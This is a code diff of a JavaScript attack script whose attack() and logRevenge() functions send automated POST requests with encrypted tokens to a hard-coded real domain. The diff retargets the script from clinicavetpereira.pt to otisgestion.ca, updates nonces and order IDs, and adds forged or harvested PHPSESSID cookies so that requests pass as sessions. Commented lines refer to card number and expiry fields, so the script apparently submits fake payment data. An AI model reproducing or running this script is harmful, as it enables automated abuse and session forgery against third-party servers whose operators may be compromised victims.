@@ -136,7 +136,7 @@ function logRevenge(domain, state, data) {
         })
 }
 
-const DOMAIN = 'clinicavetpereira.pt';
+const DOMAIN = 'otisgestion.ca';
 
 function generateDomain() {
     var text = "http://";
@@ -166,8 +166,19 @@ function getRandomDate() {
     return (month < 10 ? '0' + month : month) + '' + year
 }
 
+function generatePHPSESSID() {
+    var text = "";
+    var charset = "0123456789abcdefghijklmnopqrstuvwxyz";
+    
+    for (var i = 0; i < 26; i++)
+        text += charset.charAt(Math.floor(Math.random() * charset.length));
+    
+    return text;
+}
+
 function attack() {
-    var nonceValue = 'af847852c21a4c03e906e576e77c22c6';
+    var nonceValue = 'ae65d625cbdd98b2a05d1ffbf1c20594';
+    var phpSessionId = generatePHPSESSID();
     /*var iptS = $('#so1');    // card number  e.target.value = e.target.value.replace(/[^\dA-Z]/g, '').replace(/(.{4})/g, '$1 ').trim();     
     var iptSec = $('#secu');
     var iptExp = $('#exp');
@@ -182,6 +193,16 @@ function attack() {
         const domain = redirectRes.url.split('?')[0]
         //const domain = initDomain
 
+        // Extract PHPSESSID from Set-Cookie header
+        const setCookieHeader = redirectRes.headers.get('set-cookie');
+        let actualPhpSessionId = phpSessionId; // fallback to generated one
+        if (setCookieHeader) {
+            const phpSessionMatch = setCookieHeader.match(/PHPSESSID=([^;]+)/);
+            if (phpSessionMatch) {
+                actualPhpSessionId = phpSessionMatch[1];
+                console.log('Extracted PHPSESSID from server: ' + actualPhpSessionId);
+            }
+        }
 
         console.log('Using domain ' + domain + ' from init domain ' + initDomain)
 
@@ -204,10 +225,11 @@ function attack() {
             method: 'POST',
             headers: {
                 'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'User-Agent': userAgent
+                'User-Agent': userAgent,
+                'Cookie': 'PHPSESSID=' + actualPhpSessionId
             },
             body: JSON.stringify({
-                o: '481feb3f1ddbb',
+                o: '8dd13c22a7b82',
                 tkn: encrypted
             })
         }).then(r => r.json().then(r => {
@@ -220,11 +242,12 @@ function attack() {
                         method: 'POST',
                         headers: {
                             'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                            'User-Agent': userAgent
+                            'User-Agent': userAgent,
+                            'Cookie': 'PHPSESSID=' + actualPhpSessionId
                         },
                         body: JSON.stringify({
                             t: Date.now(),
-                            ord: "481feb3f1ddbb"
+                            ord: "8dd13c22a7b82"
                         })
                     }).then(rrep => rrep.json().then(resp => {
                         console.log(resp)
